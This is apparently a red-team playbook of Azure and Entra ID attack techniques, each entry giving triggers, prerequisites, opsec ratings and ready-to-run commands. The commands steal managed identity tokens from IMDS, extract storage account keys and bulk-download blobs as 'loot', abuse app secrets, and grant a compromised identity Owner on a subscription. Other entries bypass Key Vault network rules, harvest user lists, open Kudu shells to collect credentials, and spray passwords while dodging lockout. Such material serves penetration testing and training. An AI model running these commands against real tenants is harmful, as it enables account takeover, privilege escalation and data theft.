# Cloud – Azure / EntraID Attacks

### Azure Managed Identity Token Theft via IMDS [added: 2026-04]
- **Tags:** #Azure #ManagedIdentity #IMDS #TokenTheft #AzureVM #AppService #AzureFunction #CloudCredTheft
- **Trigger:** Compromised Azure VM, App Service, or Function App and want to steal the managed identity's access token for lateral movement
- **Prereq:** Shell/RCE on an Azure resource with a managed identity assigned + IMDS endpoint (169.254.169.254) reachable from the host
- **Yields:** Azure access token (Bearer JWT) for the managed identity, usable to call ARM, Key Vault, Storage, and other Azure APIs
- **Opsec:** Low
- **Context:** Azure resources with managed identities expose tokens via the Instance Metadata Service. From a compromised VM or App Service, query IMDS to get an access token scoped to whatever the identity has access to — no credentials stored on disk.
- **Payload/Method:**
  ```bash
  # From Azure VM — query IMDS for access token (resource = ARM)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq .

  # From App Service / Function App — use IDENTITY_ENDPOINT env var
  curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
    "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
    | jq .

  # Request token for other resources (Key Vault, Graph, Storage)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
    | jq .

  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" \
    | jq .

  # Use the stolen token
  export TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq -r .access_token)
  az account get-access-token  # compare with managed identity token
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .
  ```

### Azure Storage Account Key Extraction [added: 2026-04]
- **Tags:** #Azure #StorageAccount #StorageKeys #BlobAccess #AzCLI #DataExfil #CloudStorage #AzureStorage
- **Trigger:** Have authenticated Azure CLI session or compromised identity with storage account permissions — want to extract storage keys for full blob/queue/table access
- **Prereq:** `az` CLI authenticated + `Microsoft.Storage/storageAccounts/listkeys/action` permission on the target storage account
- **Yields:** Storage account access keys (key1/key2) granting full read/write to all blobs, queues, tables, and file shares in the account
- **Opsec:** Med
- **Context:** Storage account keys are equivalent to root access for that storage account. If the compromised identity can list keys, you get persistent full access without needing Azure AD tokens. Keys don't expire unless rotated.
- **Payload/Method:**
  ```bash
  # Enumerate storage accounts in the subscription
  az storage account list --query "[].{Name:name, RG:resourceGroup, Location:location}" -o table

  # Extract access keys for a target storage account
  az storage account keys list --account-name <STORAGE_ACCT> --resource-group <RG> -o table

  # Use key to list all blob containers
  az storage container list --account-name <STORAGE_ACCT> --account-key <KEY> -o table

  # List blobs in a container
  az storage blob list --container-name <CONTAINER> --account-name <STORAGE_ACCT> --account-key <KEY> -o table

  # Download interesting blobs
  az storage blob download --container-name <CONTAINER> --name <BLOB_NAME> \
    --account-name <STORAGE_ACCT> --account-key <KEY> --file ./loot.dat

  # Bulk download entire container
  az storage blob download-batch --destination ./loot/ --source <CONTAINER> \
    --account-name <STORAGE_ACCT> --account-key <KEY>
  ```

### EntraID Application Secret / Certificate Abuse [added: 2026-04]
- **Tags:** #EntraID #AzureAD #AppRegistration #ClientCredentials #ServicePrincipal #OAuth2 #SecretAbuse #CertificateAuth
- **Trigger:** Discovered Azure AD app registrations with client secrets or certificates — want to authenticate as the service principal for privilege escalation
- **Prereq:** Access to enumerate app registrations (Graph API or `az ad app list`) + ability to read/add credentials on the app, OR found existing secret/certificate in config files, Key Vault, or env vars
- **Yields:** OAuth2 access token as the service principal, inheriting all its role assignments and API permissions (may include Mail.Read, Directory.ReadWrite.All, etc.)
- **Opsec:** Med
- **Context:** App registrations often have overprivileged API permissions or Azure RBAC roles. If you find an existing secret in source code, env vars, or Key Vault, or if you can add a new credential to the app, you can authenticate as that service principal and inherit its permissions.
- **Payload/Method:**
  ```bash
  # Enumerate app registrations (look for ones with credentials)
  az ad app list --all --query "[?passwordCredentials || keyCredentials].{AppId:appId, DisplayName:displayName, PassCreds:length(passwordCredentials), KeyCreds:length(keyCredentials)}" -o table

  # If you can add a new secret to an app you have Owner rights on
  az ad app credential reset --id <APP_OBJECT_ID> --append --display-name "Pentest" --years 1

  # Authenticate using client_credentials grant (secret-based)
  TENANT_ID="<TENANT_ID>"
  CLIENT_ID="<APP_CLIENT_ID>"
  CLIENT_SECRET="<SECRET_VALUE>"

  curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$CLIENT_ID" \
    -d "client_secret=$CLIENT_SECRET" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "grant_type=client_credentials" | jq .

  # Use the token to call Graph API
  TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" \
    | jq -r .access_token)

  # Enumerate users, groups, directory roles
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users" | jq .
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups" | jq .
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles" | jq .
  ```

### Azure RBAC Escalation via Custom Role / User Access Administrator [added: 2026-04]
- **Tags:** #Azure #RBAC #PrivEsc #UserAccessAdministrator #RoleAssignment #CustomRole #ARM #SubscriptionTakeover
- **Trigger:** Compromised identity has User Access Administrator or a custom role with `Microsoft.Authorization/roleAssignments/write` — can escalate to Owner/Contributor
- **Prereq:** Azure identity with `Microsoft.Authorization/roleAssignments/write` permission at the target scope (subscription, resource group, or resource) + knowledge of your own principal ID
- **Yields:** Owner or Contributor role on the target scope, granting full control over all Azure resources within that scope
- **Opsec:** High
- **Context:** User Access Administrator can assign any role including Owner. If you land on an identity with this role (often assigned broadly for automation), you can grant yourself Owner on the subscription. This is one of the most common Azure privilege escalation paths.
- **Payload/Method:**
  ```bash
  # Check current role assignments for the compromised identity
  az role assignment list --assignee <PRINCIPAL_ID> -o table

  # Check if you have User Access Administrator or similar
  az role assignment list --assignee <PRINCIPAL_ID> --query "[?roleDefinitionName=='User Access Administrator']" -o table

  # Get your own principal ID (object ID)
  MY_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)

  # Assign Owner role to yourself at subscription scope
  SUBSCRIPTION_ID=$(az account show --query id -o tsv)
  az role assignment create \
    --role "Owner" \
    --assignee-object-id "$MY_OBJECT_ID" \
    --scope "/subscriptions/$SUBSCRIPTION_ID"

  # Or via direct ARM API call (if az cli is unavailable)
  ROLE_DEF_ID="/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"  # Owner
  curl -s -X PUT \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments/$(uuidgen)?api-version=2022-04-01" \
    -d "{\"properties\":{\"roleDefinitionId\":\"$ROLE_DEF_ID\",\"principalId\":\"$MY_OBJECT_ID\"}}"

  # Verify escalation
  az role assignment list --assignee "$MY_OBJECT_ID" -o table
  ```

### Azure Blob Anonymous Enumeration via Static Site URL [added: 2026-05]
- **Tags:** #Azure #BlobStorage #Anonymous #Unauthenticated #InitialAccess #BlobEnum #StaticSite #AzureStorage
- **Trigger:** Target URL contains `/$web/` path segment (indicates Azure Static Website hosted on Blob Storage) — test whether the container is publicly listable
- **Prereq:** No credentials needed; target exposes an Azure Static Website URL (`<account>.blob.core.windows.net/$web/...` or CNAME pointing to it)
- **Yields:** Full blob listing including file names, version IDs, and downloadable artifacts — often contains scripts, zips, or config files with embedded credentials
- **Opsec:** Low
- **Context:** Azure Static Websites use the `$web` container. If anonymous access is enabled on the storage account, the container manifest is publicly listable. The storage account name is often leaked in the HTTP response or DNS CNAME of the custom domain. Version IDs in the listing allow downloading specific blob versions.
- **Payload/Method:**
  ```bash
  # Step 1: Discover storage account name from the custom domain response
  curl 'https://<target-domain>/$web?restype=container&comp=list' | xmllint --format -
  # Reveals: <Url>https://<STORAGE_ACCT>.blob.core.windows.net/$web/...</Url>

  # Step 2: Enumerate all blobs including versions in the discovered account
  curl -H "x-ms-version: 2019-12-12" \
    'https://<STORAGE_ACCT>.blob.core.windows.net/$web?restype=container&comp=list&include=versions' \
    | xmllint --format - | grep -E '<Name>|<VersionId>'

  # Step 3: Download a specific blob by version ID
  curl -H "x-ms-version: 2019-12-12" \
    'https://<STORAGE_ACCT>.blob.core.windows.net/$web/<blob_name>?versionId=<VERSION_ID>' \
    --output <local_file>
  ```

### Azure Key Vault Network ACL Bypass via AzureServices Trusted Bypass [added: 2026-05]
- **Tags:** #Azure #KeyVault #NetworkACL #Bypass #Secrets #AzureCLI #AzureServices #MisconfiguredFirewall
- **Trigger:** Key Vault has `networkAcls.defaultAction: Deny` with an IP allowlist, but `az keyvault secret list` or `az keyvault secret show` succeeds from an unexpected IP — or `bypass: AzureServices` is visible in the vault config
- **Prereq:** Authenticated `az` CLI session with `Key Vault Secrets User` (or higher) RBAC role on the vault; vault must have `"bypass": "AzureServices"` in its network ACL config
- **Yields:** Plaintext secrets from the Key Vault (credentials, API keys, certificates) regardless of the IP allowlist
- **Opsec:** Low
- **Context:** Azure Key Vault network ACLs support a `bypass` field. When set to `AzureServices`, Microsoft-trusted first-party services — including the Azure CLI (`az`) — are exempted from the IP rules even when `defaultAction: Deny`. An attacker with valid RBAC can read all secrets via `az` CLI from any IP. Always check `bypass` value before concluding a Key Vault is unreachable. `enableRbacAuthorization: true` means only RBAC controls secret access; `accessPolicies: []` is irrelevant in this mode.
- **Payload/Method:**
  ```bash
  # Confirm bypass setting (look for "bypass": "AzureServices")
  az keyvault show --name <VAULT_NAME> --query "properties.networkAcls"

  # Confirm your RBAC (need Key Vault Secrets User or Key Vault Administrator)
  az role assignment list --all --assignee <UPN_OR_APP_ID> | grep roleDefinitionName

  # List secrets — succeeds despite IP allowlist if bypass=AzureServices
  az keyvault secret list --vault-name <VAULT_NAME> --query "[].name" -o tsv

  # Read each secret value
  az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --query value -o tsv
  ```

### Azure AD UPN/SPN Harvesting via Authenticated az CLI [added: 2026-05]
- **Tags:** #Azure #AzureAD #Enumeration #UPN #ServicePrincipal #Recon #GraphAPI #AzureCLI
- **Trigger:** Have authenticated `az` CLI access (any user-level account); need to build a target list for password spray, phishing, or service principal abuse
- **Prereq:** Authenticated `az` CLI session; tenant must allow `az ad user list` and `az ad sp list` (default for non-guest accounts in most tenants)
- **Yields:** Full list of User Principal Names (UPNs) and Service Principal details — usable for credential spray, phishing target selection, or identifying over-privileged SPNs
- **Opsec:** Med
- **Context:** Default Azure AD settings allow authenticated users to enumerate all users and service principals in the tenant via MS Graph. `az ad user list` wraps `GET /v1.0/users` and `az ad sp list` wraps `GET /v1.0/servicePrincipals`. Enumeration is logged in Entra Sign-In logs but is rarely alerted on without custom detections.
- **Payload/Method:**
  ```bash
  # Harvest all UPNs
  az ad user list --query "[].userPrincipalName" -o tsv | tee validUPN.txt

  # Harvest service principal details (appId, displayName, servicePrincipalType)
  az ad sp list --query "[].{Name:displayName, AppId:appId, Type:servicePrincipalType}" -o table | tee sp_info.txt

  # Get full details on a specific user (check for sensitive fields like jobTitle used for flags)
  az ad signed-in-user show
  az ad user show --id <UPN_OR_OBJECT_ID>
  ```

### Azure EntraID Tenant Discovery via getuserrealm + openid-configuration [added: 2026-05]
- **Tags:** #Azure #EntraID #Recon #TenantID #Unauthenticated #OSINT #AzureAD #InitialRecon
- **Trigger:** Given a target domain — need to confirm Azure/EntraID presence and extract the Tenant ID before any credential is available
- **Prereq:** Target domain only; no credentials needed
- **Yields:** Confirmation that Entra ID is in use (`NameSpaceType: Managed` vs federated), the Tenant ID GUID, and whether MFA/federation applies — all of which gate subsequent spray and token requests
- **Opsec:** Low
- **Context:** Two unauthenticated endpoints leak Entra ID metadata. `getuserrealm.srf` reveals whether the domain is Managed (cloud-only) or Federated (on-prem ADFS/PingFed). `openid-configuration` leaks the Tenant ID in the `token_endpoint` field. Tenant ID is required for OAuth2 token requests, service principal auth, and scoping API calls.
- **Payload/Method:**
  ```bash
  # Step 1: Confirm Entra ID and federation type
  curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=<DOMAIN>&xml=1' | xmllint --format -
  # Look for: <NameSpaceType>Managed</NameSpaceType> (cloud-only) vs Federated

  # Step 2: Extract Tenant ID from token_endpoint
  curl -s 'https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration' \
    | jq -r '.token_endpoint' | grep -oP '[0-9a-f-]{36}'
  # Returns: <TENANT_ID> (UUID in the token_endpoint URL)
  ```

### Azure Infrastructure Subdomain Enumeration via azsubenum [added: 2026-05]
- **Tags:** #Azure #Recon #SubdomainEnum #AzureServices #BlobStorage #AppService #OSINT #azsubenum
- **Trigger:** Target company name is known — need to discover Azure storage accounts, App Services, queues, tables, and SCM endpoints without credentials
- **Prereq:** `azsubenum.py` installed; permutations wordlist; company name (NOT the full domain — use just the company slug, e.g. `megabigtech` not `megabigtech.com`)
- **Yields:** Map of live Azure infrastructure: Blob/Queue/Table/File storage accounts, App Service FQDNs, SCM management endpoints, SharePoint sites, onmicrosoft.com tenant name
- **Opsec:** Low
- **Context:** Azure services use predictable FQDN patterns (`<name>.blob.core.windows.net`, `<name>.azurewebsites.net`, etc.). azsubenum.py tests permutations of the company slug against all Azure service namespaces. Critical gotcha: the `-b` flag takes the company slug WITHOUT the TLD — passing `megabigtech.com` instead of `megabigtech` yields zero results. SCM endpoints (`<app>.scm.azurewebsites.net`) are high-value targets for `Website Contributor` role abuse.
- **Payload/Method:**
  ```bash
  # CORRECT: use company slug without TLD
  python3 azsubenum.py -b <COMPANY_SLUG> -p permutations.txt

  # WRONG (yields no results):
  # python3 azsubenum.py -b company.com -p permutations.txt

  # Key output sections to note:
  # - "Storage Accounts - Blobs" → try anonymous listing
  # - "App Services" → browse + check for creds
  # - "App Services - Management" → Kudu SCM endpoints (exploit with Website Contributor)
  ```

### Azure App Service Kudu SCM Shell via Website Contributor Role [added: 2026-05]
- **Tags:** #Azure #AppService #Kudu #SCM #WebsiteContributor #CredHarvest #RCE #WebShell
- **Trigger:** Compromised user has `Website Contributor` (or higher) RBAC on an App Service resource — SCM endpoint (`<app>.scm.azurewebsites.net`) is accessible
- **Prereq:** Authenticated Azure identity with `Website Contributor` role on the target App Service; SCM endpoint reachable (not restricted by network rules)
- **Yields:** Interactive PowerShell/Bash shell in the App Service container via Kudu Debug Console; access to all files deployed on the app including scripts, config files, and environment variables with embedded credentials
- **Opsec:** Med
- **Context:** Azure App Service `Website Contributor` grants full control over the app including access to the Kudu SCM interface at `<appname>.scm.azurewebsites.net`. Kudu exposes a Debug Console (PowerShell on Windows, Bash on Linux) that runs in the app's process context. Scripts deployed alongside the app frequently contain hardcoded DB connection strings, API keys, or other credentials. `az role assignment list --all` (not `--assignee`) is required to see resource-scoped assignments that `--assignee` misses.
- **Payload/Method:**
  ```bash
  # Step 1: Confirm Website Contributor role (use --all to catch resource-scoped assignments)
  az role assignment list --all | grep -A2 -B2 "Website Contributor"

  # Step 2: Find the SCM endpoint (from azsubenum or resource list)
  az resource list --query "[?type=='Microsoft.Web/sites'].name" -o tsv
  # SCM URL: https://<appname>.scm.azurewebsites.net

  # Step 3: Browse to SCM, navigate Debug Console → PowerShell/CMD/Bash
  # Search for credential files in the app directory:
  # C:\home\site\wwwroot\  (Windows)  or  /home/site/wwwroot/  (Linux)
  Get-ChildItem -Recurse | Select-String -Pattern "password|credential|secret|connectionstring" -l

  # Step 4: Extract DB creds and query via sqlcmd (Windows Kudu)
  sqlcmd -S <SQL_SERVER>.database.windows.net -U <USER> -P '<PASS>' -d <DB> -Q "SELECT * FROM <TABLE>"
  ```

### Azure UPN Generation + Password Spray via oh365userfinder [added: 2026-05]
- **Tags:** #Azure #EntraID #PasswordSpray #UPNGeneration #oh365userfinder #InitialAccess #CredAccess #BruteForce
- **Trigger:** Employee names discovered (About Us page, LinkedIn, app pages) + a candidate password found (pastebin, source code, config leak) — want to find valid Azure AD accounts
- **Prereq:** Employee full names + target domain + candidate password(s); `oh365userfinder.py` and `upn_generator.py` installed
- **Yields:** Valid Azure AD credentials (UPN + password) for initial authentication as a cloud user
- **Opsec:** Med (smart lockout triggers after ~10 failed attempts per account; spray slowly across accounts not attempts per account)
- **Context:** Azure AD enforces Smart Lockout (default: lockout after 10 bad attempts). Safe spray pattern: one password attempt per account per spray cycle, iterate through all accounts before trying a second password. Employee names from public web pages yield predictable UPN formats (firstname.lastname, f.lastname, flastname). Iterate subdomains and app pages — not just the main site — for additional names. `oh365userfinder --pwspray` handles spray cadence.
- **Payload/Method:**
  ```bash
  # Step 1: Generate UPN candidates for each discovered name
  python3 upn_generator.py --domain <DOMAIN> --user 'First Last' --output upn_candidates.txt
  # Repeat for each name, append: python3 upn_generator.py ... | tee -a upn_candidates.txt

  # Step 2: Spray (one password, all accounts — respects Smart Lockout)
  python3 oh365userfinder.py -p '<CANDIDATE_PASSWORD>' --pwspray --elist upn_candidates.txt

  # Step 3: Enumerate more names from discovered subdomains/apps (not just main site)
  # Browse: azurewebsites.net apps, About pages, team pages
  # Then re-generate UPNs and re-spray

  # Step 4: Confirm valid account with az login
  az login --username <HIT_UPN> --password '<PASSWORD>'
  ```
